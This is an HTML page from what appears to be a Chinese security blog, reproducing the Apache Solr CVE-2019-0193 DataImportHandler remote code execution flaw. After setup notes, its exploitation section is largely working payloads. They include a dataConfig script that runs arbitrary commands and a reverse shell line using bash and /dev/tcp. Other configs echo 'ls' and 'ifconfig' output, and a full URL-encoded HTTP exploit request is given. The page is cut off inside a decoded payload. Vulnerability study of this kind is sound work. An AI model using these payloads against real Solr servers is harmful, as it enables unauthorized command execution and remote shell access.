@@ -1,0 +1,1251 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="th3wind">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="th3wind">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="纯净水@流云-自留地">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>Apache Solr CVE-2019-0193 复现与学习 · 纯净水@流云</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/favicon.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >凡心所向，素履所往</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">Apache Solr CVE-2019-0193 复现与学习</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>凡心所向，素履所往</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            Apache Solr CVE-2019-0193 复现与学习
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞学习">漏洞学习</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "web 渗透">web 渗透</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Apache Solr CVE-2019-0193">Apache Solr CVE-2019-0193</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.3k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/09/08</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Apache-Solr-CVE-2019-0193-复现与学习"><a href="#Apache-Solr-CVE-2019-0193-复现与学习" class="headerlink" title="Apache Solr CVE-2019-0193 复现与学习"></a>Apache Solr CVE-2019-0193 复现与学习</h1><p>[TOC]</p>
+<h2 id="简介（抄袭，具体功能没搞懂）"><a href="#简介（抄袭，具体功能没搞懂）" class="headerlink" title="简介（抄袭，具体功能没搞懂）"></a>简介（抄袭，具体功能没搞懂）</h2><p>Apache Solr是一个企业级搜索平台，用Java编写且开源，基于Apache Lucene项目。</p>
+<p>主要功能包括：<br>full-text search 全文搜索<br>hit highlighting<br>faceted search<br>dynamic clustering 动态聚类<br>document parsing 文档解析<br>Solr可以像数据库一样被使用：<br>1.运行服务器，创建collection1<br>2.从外部获取数据 - 向collection1发送不同类型的数据（例如文本，xml文档，pdf文档等任何格式）<br>3.存储数据并生成索引 - Solr自动索引这些数据并提供快速、丰富的REST API接口，以便于你搜索已有数据<br>与Solr服务器通信的唯一协议是HTTP，并且默认情况下无需身份验证即可访问，所以Solr容易受到web攻击(SSRF，CSRF等)。</p>
+<h2 id="漏洞-CVE-2019-0193"><a href="#漏洞-CVE-2019-0193" class="headerlink" title="漏洞 CVE-2019-0193"></a>漏洞 CVE-2019-0193</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
+<li>1.Apache Solr的DataImportHandler启用了模块DataImportHandler(默认情况下该模块不会被启用)</li>
+<li>2.Solr Admin UI未开启鉴权认证。（默认情况下打开web界面无需任何认证</li>
+</ul>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="简版vulhub"><a href="#简版vulhub" class="headerlink" title="简版vulhub"></a>简版vulhub</h4><p>直接利用vulhub进行搭建测试，详情按下不表。<br>这个漏洞复现遇到点问题，根据教程搭建的环境，进行复现，结果发现没法触发成功,运行poc 报错如下<br><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673229505327.jpg" alt="-w1220"><br>感觉应该是vps的防火墙配置出的问题，换成本地调试没有问题<br><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248523422.jpg" alt="-w1375"><br><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248663003.jpg" alt="-w727"></p>
+<h4 id="配置下载"><a href="#配置下载" class="headerlink" title="配置下载"></a>配置下载</h4><p>apache solr 版本：Solr-8.1.1<br>jdk版本：1.8.0_144<br>在idea 中调试该环境</p>
+<h5 id="源码导入idea调试"><a href="#源码导入idea调试" class="headerlink" title="源码导入idea调试"></a>源码导入idea调试</h5><ul>
+<li>配置ant server</li>
+</ul>
+<p><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673449263122.jpg" alt="-w479"></p>
+<pre><code>ant ivy-bootstrap  //安装ivy
+cd solr
+ant server
+cd ..
+ant idea
+
+</code></pre><ul>
+<li>启动远程调试<br>创建 test core<br><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673861985710.jpg" alt="-w610"><br>这个时候会发现报错，需要在<pre><code>solr-7.7.2/solr/server/solr/test/conf
+</code></pre>目录进行修改添加</li>
+</ul>
+<pre><code> &lt;requestHandler name=&quot;/dataimport&quot; class=&quot;solr.DataImportHandler&quot;&gt; 
+      &lt;lst name=&quot;defaults&quot;&gt; 
+        &lt;str name=&quot;config&quot;&gt;data-config.xml&lt;/str&gt; 
+      &lt;/lst&gt; 
+    &lt;/requestHandler&gt;
+</code></pre><p>发现继续报错</p>
+<pre><code>Error loading class &#39;org.apache.solr.handler.dataimport.DataImportHandler&#39;
+</code></pre><pre><code>cp solr/dist/solr-dataimporthander  server/solr-webapp/webapp/WEB-INF/lib 
+</code></pre><p><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675673373203.jpg" alt="-w458"></p>
+<p>可以正常创建了<br><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675675380907.jpg" alt="-w1420"></p>
+<ul>
+<li>调试命令</li>
+</ul>
+<pre><code>$ cd solr-8.1.1\server
+$ java &quot;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=9000&quot; -Dsolr.solr.home=&quot;../example/example-DIH/solr/&quot; -jar start.jar --module=http
+</code></pre><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="数据源类型为URLDataSource"><a href="#数据源类型为URLDataSource" class="headerlink" title="数据源类型为URLDataSource"></a>数据源类型为URLDataSource</h4><ul>
+<li>测试poc：</li>
+</ul>
+<pre><code>&lt;dataConfig&gt;
+&lt;dataSource type=&quot;URLDataSource&quot;/&gt;
+  &lt;script&gt;&lt;![CDATA[ java.lang.Runtime.getRuntime().exec(&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);
+  ]]&gt;&lt;/script&gt;
+  &lt;document&gt;
+    &lt;entity name=&quot;a&quot;
+            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;
+            processor=&quot;XPathEntityProcessor&quot;
+            forEach=&quot;/feed&quot;
+            transformer=&quot;script:&quot; /&gt;
+  &lt;/document&gt;
+&lt;/dataConfig&gt;
+</code></pre><ul>
+<li>反弹shell</li>
+</ul>
+<pre><code>&lt;dataConfig&gt;
+&lt;dataSource type=&quot;URLDataSource&quot;/&gt;
+  &lt;script&gt;&lt;![CDATA[ java.lang.Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/9999 0&gt;&amp;1&quot;);
+  ]]&gt;&lt;/script&gt;
+  &lt;document&gt;
+    &lt;entity name=&quot;a&quot;
+            url=&quot;https://stackoverflow.com/feeds/tag/solr&quot;
+            processor=&quot;XPathEntityProcessor&quot;
+            forEach=&quot;/feed&quot;
+            transformer=&quot;script:&quot; /&gt;
+  &lt;/document&gt;
+&lt;/dataConfig&gt;
+</code></pre><pre><code>&lt;dataConfig&gt;
+
+
+  &lt;dataSource type=&quot;URLDataSource&quot;/&gt;
+  &lt;script&gt;&lt;![CDATA[
+
+          function poc(row){
+
+ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/9999 0&gt;&amp;1&quot;)));
+
+var result = [];
+
+while(true) {
+var oneline = bufReader.readLine();
+result.push( oneline );
+if(!oneline) break;
+}
+
+row.put(&quot;title&quot;,result.join(&quot;\n\r&quot;));
+
+return row;
+
+}
+
+
+  ]]&gt;&lt;/script&gt;
+
+        &lt;document&gt;
+             &lt;entity name=&quot;entity1&quot;
+                     url=&quot;https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml&quot;
+                     processor=&quot;XPathEntityProcessor&quot;
+                     forEach=&quot;/RDF/item&quot;
+                     transformer=&quot;script:poc&quot;&gt;
+                        &lt;field column=&quot;title&quot; xpath=&quot;/RDF/item/title&quot; /&gt;
+             &lt;/entity&gt;
+        &lt;/document&gt;
+&lt;/dataConfig&gt;
+</code></pre><p><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679455381821.jpg" alt="-w558"></p>
+<p>默认权限为程序的启动权限</p>
+<h5 id="远程检测poc"><a href="#远程检测poc" class="headerlink" title="远程检测poc"></a>远程检测poc</h5><ul>
+<li>外连有回显</li>
+</ul>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataConfig</span><span class="token punctuation">></span></span>
+ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>URLDataSource<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[
+          function poc(row){
+ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ls").getInputStream()));
+
+var result = [];
+
+while(true) {
+var oneline = bufReader.readLine();
+result.push( oneline );
+if(!oneline) break;
+}
+
+row.put("title",result.join("\n\r"));
+
+return row;
+
+}
+  ]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>document</span><span class="token punctuation">></span></span>
+             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entity</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>entity1<span class="token punctuation">"</span></span>
+                     <span class="token attr-name">url</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml<span class="token punctuation">"</span></span>
+                     <span class="token attr-name">processor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XPathEntityProcessor<span class="token punctuation">"</span></span>
+                     <span class="token attr-name">forEach</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item<span class="token punctuation">"</span></span>
+                     <span class="token attr-name">transformer</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>script:poc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>field</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>title<span class="token punctuation">"</span></span> <span class="token attr-name">xpath</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/RDF/item/title<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>entity</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>document</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataConfig</span><span class="token punctuation">></span></span>
+</code></pre>
+<p>其中<code>https://raw.githubusercontent.com/1135/solr_exploit/master/URLDataSource/demo.xml</code>文件内容如下：</p>
+<pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>RDF</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">/></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RDF</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="/posts/1199978306/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679479637186.jpg" alt="-w1437"></p>
+<h4 id="数据源类型为ContentStreamDataSource"><a href="#数据源类型为ContentStreamDataSource" class="headerlink" title="数据源类型为ContentStreamDataSource"></a>数据源类型为ContentStreamDataSource</h4><ul>
+<li>不外连 + 回显<br>在该检测方式中 由于 ContentStreamDataSource能接收Post数据直接作为数据源，可以不用外连获取数据源。</li>
+</ul>
+<pre><code>POST /solr/tika/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=tika&amp;name=dataimport&amp;dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%66%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20 HTTP/1.1
+Host: solr.com:8983
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
+Accept: application/json, text/plain, */*
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Referer: http://solr.com:8983/solr/
+Content-Length: 210
+content-type: multipart/form-data; boundary=------------------------aceb88c2159f183f
+
+
+--------------------------aceb88c2159f183f
+Content-Disposition: form-data; name=&quot;stream.body&quot;
+
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;RDF&gt;
+&lt;item/&gt;
+&lt;/RDF&gt;
+
+--------------------------aceb88c2159f183f--
+</code></pre><p>url 解码后数据如下</p>
+<pre class=" language-xml"><code class="language-xml">
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataConfig</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dataSource</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>streamsrc<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ContentStreamDataSource<span class="token punctuation">"</span></span> <span class="token attr-name">loggerLevel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>TRACE<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token cdata">&lt;![CDATA[
+          function poc(row){
+ var bufReader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("ifconfig").getInputStream()));
+
+var result = [];
+
+while(true) {
+var oneline = bufReader.readLine();
+result.push( oneline );
+if(!oneline) break;
+}
+
+row.put("title",result.join("\n\r"));
+return row;
+
+}
+
+]]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>document</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>entity</span>
+        <span class="token attr-name">stream</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span>
+        <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>entity1<span class="token punctuation">"</span></span>
+        <span class="token attr-name">datasource</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>streamsrc1<span class="token punctuation">"</span></span>
+        <span class="token attr-name">processor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>XPathEntityProcessor<span class="token punctuation">"</span></span>
